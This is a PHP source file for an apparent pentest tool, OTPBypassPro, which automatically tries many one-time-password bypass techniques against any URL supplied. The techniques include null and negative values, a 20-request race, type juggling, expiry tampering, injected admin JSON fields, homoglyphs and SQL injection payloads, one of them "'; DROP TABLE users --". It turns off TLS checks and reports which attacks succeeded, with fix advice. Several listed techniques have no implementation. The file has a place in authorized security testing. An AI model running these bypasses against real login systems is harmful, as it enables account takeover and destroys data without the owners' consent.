<?php
namespace Burp\Core;

class OTPBypassPro {
    private $redis;
    private $logger;
    private $results = [];
    private $techniques = [
        'parameter_removal',
        'null_injection',
        'negative_value',
        'race_condition',
        'type_juggling',
        'expiry_manipulation',
        'json_injection',
        'array_injection',
        'regex_bypass',
        'unicode_homograph',
        'base64_encoding',
        'hex_encoding',
        'double_encoding',
        'sql_injection',
        'xml_injection',
        'session_fixation'
    ];
    
    public function __construct() {
        $this->redis = new \Redis();
        $this->redis->connect($_ENV['REDIS_HOST'] ?? 'redis', $_ENV['REDIS_PORT'] ?? 6379);
        $this->logger = Logger::getInstance();
    }
    
    public function runAll($params) {
        $this->results = [];
        $target = $params['target'] ?? '';
        $otp = $params['otp'] ?? '123456';
        $method = strtoupper($params['method'] ?? 'POST');
        $headers = $params['headers'] ?? [];
        $body = $params['body'] ?? '';
        
        if (empty($target)) {
            return json_encode(['error' => 'Target URL required']);
        }
        
        foreach ($this->techniques as $tech) {
            $methodName = 'bypass_' . str_replace('-', '_', $tech);
            if (method_exists($this, $methodName)) {
                $result = $this->$methodName($target, $otp, $method, $headers, $body);
                $this->results[$tech] = $result;
            }
        }
        
        // Generate report
        $report = $this->generateReport($params);
        
        // Save to Redis
        $id = uniqid('otp_report_');
        $this->redis->setex("otp_report:$id", 86400, json_encode($report));
        
        return json_encode($report);
    }
    
    public function runSingleTechnique($params) {
        $technique = $params['technique'] ?? '';
        $target = $params['target'] ?? '';
        $otp = $params['otp'] ?? '123456';
        $method = strtoupper($params['method'] ?? 'POST');
        $headers = $params['headers'] ?? [];
        $body = $params['body'] ?? '';
        
        if (empty($technique) || empty($target)) {
            return json_encode(['error' => 'Technique and target required']);
        }
        
        $methodName = 'bypass_' . str_replace('-', '_', $technique);
        if (!method_exists($this, $methodName)) {
            return json_encode(['error' => 'Technique not found']);
        }
        
        $result = $this->$methodName($target, $otp, $method, $headers, $body);
        return json_encode(['technique' => $technique, 'result' => $result]);
    }
    
    public function getReport($params) {
        $id = $params['id'] ?? '';
        if (empty($id)) {
            return json_encode(['error' => 'Report ID required']);
        }
        
        $data = $this->redis->get("otp_report:$id");
        if (!$data) {
            return json_encode(['error' => 'Report not found']);
        }
        
        return $data;
    }
    
    // ---- BYPASS TECHNIQUES ----
    
    private function bypass_parameter_removal($target, $otp, $method, $headers, $body) {
        $url = preg_replace('/[&?]otp=[^&]*/', '', $target);
        $response = $this->sendRequest($url, $method, $headers, $body);
        return ['status' => $response['success'], 'url' => $url, 'response' => $response];
    }
    
    private function bypass_null_injection($target, $otp, $method, $headers, $body) {
        $nullValues = ['null', 'NULL', 'undefined', 'none', 'nil', '0', ''];
        $results = [];
        
        foreach ($nullValues as $null) {
            $url = str_replace($otp, $null, $target);
            $response = $this->sendRequest($url, $method, $headers, $body);
            $results[] = ['value' => $null, 'status' => $response['success']];
        }
        
        return ['results' => $results, 'status' => in_array(true, array_column($results, 'status'))];
    }
    
    private function bypass_negative_value($target, $otp, $method, $headers, $body) {
        $negativeValues = ['-1', '-999', '-0', '-0001'];
        $results = [];
        
        foreach ($negativeValues as $neg) {
            $url = str_replace($otp, $neg, $target);
            $response = $this->sendRequest($url, $method, $headers, $body);
            $results[] = ['value' => $neg, 'status' => $response['success']];
        }
        
        return ['results' => $results, 'status' => in_array(true, array_column($results, 'status'))];
    }
    
    private function bypass_race_condition($target, $otp, $method, $headers, $body) {
        $mh = curl_multi_init();
        $handles = [];
        
        for ($i = 0; $i < 20; $i++) {
            $ch = curl_init();
            $url = str_replace($otp, $otp . rand(0, 9), $target);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
            
            if ($method === 'POST') {
                $postBody = !empty($body) ? str_replace('{{otp}}', $otp, $body) : json_encode(['otp' => $otp]);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postBody);
            }
            
            curl_multi_add_handle($mh, $ch);
            $handles[] = $ch;
        }
        
        $running = null;
        do { curl_multi_exec($mh, $running); } while ($running);
        
        $success = false;
        foreach ($handles as $ch) {
            $response = curl_multi_getcontent($ch);
            if (stripos($response, 'success') !== false || stripos($response, 'verified') !== false) {
                $success = true;
                break;
            }
            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);
        }
        curl_multi_close($mh);
        
        return ['status' => $success, 'requests' => count($handles)];
    }
    
    private function bypass_type_juggling($target, $otp, $method, $headers, $body) {
        $variants = [
            $otp,
            (int)$otp,
            (float)$otp,
            $otp . ' ',
            ' ' . $otp,
            $otp . "\n",
            "\t" . $otp,
            "0x" . dechex(intval($otp)),
            "0" . $otp,
            $otp . ".0",
            $otp . "e0",
            "+" . $otp,
            "-" . $otp,
            "'" . $otp . "'",
            '"' . $otp . '"'
        ];
        
        $results = [];
        foreach ($variants as $variant) {
            $url = str_replace($otp, urlencode($variant), $target);
            $response = $this->sendRequest($url, $method, $headers, $body);
            $results[] = ['value' => $variant, 'status' => $response['success']];
        }
        
        return ['results' => $results, 'status' => in_array(true, array_column($results, 'status'))];
    }
    
    private function bypass_expiry_manipulation($target, $otp, $method, $headers, $body) {
        $times = [
            '+5 minutes',
            '+1 hour',
            '+1 day',
            '+1 week',
            '2025-01-01',
            '2099-12-31',
            '+1 year',
            '+10 years'
        ];
        
        $results = [];
        foreach ($times as $time) {
            $expiry = date('Y-m-d H:i:s', strtotime($time));
            $url = $target . '&expiry=' . urlencode($expiry);
            $response = $this->sendRequest($url, $method, $headers, $body);
            $results[] = ['time' => $time, 'status' => $response['success']];
        }
        
        return ['results' => $results, 'status' => in_array(true, array_column($results, 'status'))];
    }
    
    private function bypass_json_injection($target, $otp, $method, $headers, $body) {
        $injections = [
            '{"otp":"' . $otp . '","admin":true}',
            '{"otp":"' . $otp . '","role":"admin"}',
            '{"otp":"' . $otp . '","user":"admin"}',
            '{"otp":' . $otp . ',"admin":true}',
            '{"otp":"' . $otp . '","is_verified":true}'
        ];
        
        $results = [];
        foreach ($injections as $injected) {
            $newBody = str_replace($body, $injected, $body);
            $response = $this->sendRequest($target, $method, $headers, $newBody);
            $results[] = ['payload' => $injected, 'status' => $response['success']];
        }
        
        return ['results' => $results, 'status' => in_array(true, array_column($results, 'status'))];
    }
    
    private function bypass_unicode_homograph($target, $otp, $method, $headers, $body) {
        $homoglyphs = [
            '0' => ['０', 'ο', 'о', 'ᴏ', 'ⵔ', '∅'],
            '1' => ['１', '一', 'ا', 'ᛁ', 'ᒥ', '|'],
            '2' => ['２', 'ニ', 'զ', 'ᒿ', 'ƻ'],
            '3' => ['３', 'з', 'ჳ', 'ᗭ', 'Ɛ'],
            '4' => ['４', '四', 'δ', 'ᒿ', 'Ꮞ'],
            '5' => ['５', '五', 'ဒ', 'ᗭ', 'Ƽ'],
            '6' => ['６', '六', 'б', 'Ꮾ', 'Ƅ'],
            '7' => ['７', '七', 'τ', 'Ꭲ', 'Ƭ'],
            '8' => ['８', '八', 'в', 'Ꮪ', 'Ʒ'],
            '9' => ['９', '九', 'р', 'Ꮫ', 'Ƽ']
        ];
        
        $variants = [$otp];
        for ($i = 0; $i < strlen($otp); $i++) {
            $digit = $otp[$i];
            if (isset($homoglyphs[$digit])) {
                foreach ($homoglyphs[$digit] as $glyph) {
                    $variants[] = substr_replace($otp, $glyph, $i, 1);
                }
            }
        }
        
        $results = [];
        foreach ($variants as $variant) {
            $url = str_replace($otp, urlencode($variant), $target);
            $response = $this->sendRequest($url, $method, $headers, $body);
            $results[] = ['value' => $variant, 'status' => $response['success']];
        }
        
        return ['results' => $results, 'status' => in_array(true, array_column($results, 'status'))];
    }
    
    private function bypass_sql_injection($target, $otp, $method, $headers, $body) {
        $payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "'; DROP TABLE users --",
            "' UNION SELECT 1,2,3 --",
            "' OR '1'='1' AND '1'='1",
            "' AND 1=1 --",
            "admin'--",
            "' or 1=1 or ''='"
        ];
        
        $results = [];
        foreach ($payloads as $payload) {
            $url = str_replace($otp, urlencode($payload), $target);
            $response = $this->sendRequest($url, $method, $headers, $body);
            $results[] = ['payload' => $payload, 'status' => $response['success']];
        }
        
        return ['results' => $results, 'status' => in_array(true, array_column($results, 'status'))];
    }
    
    private function sendRequest($url, $method, $headers, $body) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        
        if (!empty($headers)) {
            $headerArray = [];
            foreach ($headers as $key => $value) {
                $headerArray[] = "$key: $value";
            }
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headerArray);
        }
        
        if ($method === 'POST' && !empty($body)) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return [
            'success' => $httpCode === 200 && 
                (stripos($response, 'success') !== false || 
                 stripos($response, 'verified') !== false ||
                 stripos($response, 'approved') !== false ||
                 stripos($response, 'valid') !== false),
            'code' => $httpCode,
            'response_preview' => substr($response, 0, 500)
        ];
    }
    
    private function generateReport($params) {
        $successful = array_filter($this->results, function($r) {
            return isset($r['status']) && $r['status'] === true;
        });
        
        return [
            'timestamp' => date('Y-m-d H:i:s'),
            'target' => $params['target'],
            'otp' => $params['otp'] ?? '123456',
            'techniques_tested' => count($this->results),
            'successful_count' => count($successful),
            'successful_techniques' => array_keys($successful),
            'all_results' => $this->results,
            'report_id' => uniqid('otp_bypass_'),
            'severity' => count($successful) > 5 ? 'CRITICAL' : 'HIGH',
            'recommendations' => $this->generateRecommendations($successful)
        ];
    }
    
    private function generateRecommendations($successful) {
        $recommendations = [];
        
        if (isset($successful['parameter_removal'])) {
            $recommendations[] = 'Fix: Do not accept requests without OTP parameter. Validate presence.';
        }
        
        if (isset($successful['null_injection']) || isset($successful['negative_value'])) {
            $recommendations[] = 'Fix: Validate OTP values properly. Reject null, negative, and edge cases.';
        }
        
        if (isset($successful['race_condition'])) {
            $recommendations[] = 'Fix: Implement proper locking. Use atomic operations for OTP validation.';
        }
        
        if (isset($successful['type_juggling'])) {
            $recommendations[] = 'Fix: Use strict type checking (===) for OTP comparison.';
        }
        
        if (isset($successful['sql_injection'])) {
            $recommendations[] = 'Fix: Use prepared statements. Never trust user input.';
        }
        
        if (isset($successful['expiry_manipulation'])) {
            $recommendations[] = 'Fix: Validate expiry on server-side. Never trust client-side expiry.';
        }
        
        return $recommendations;
    }
}
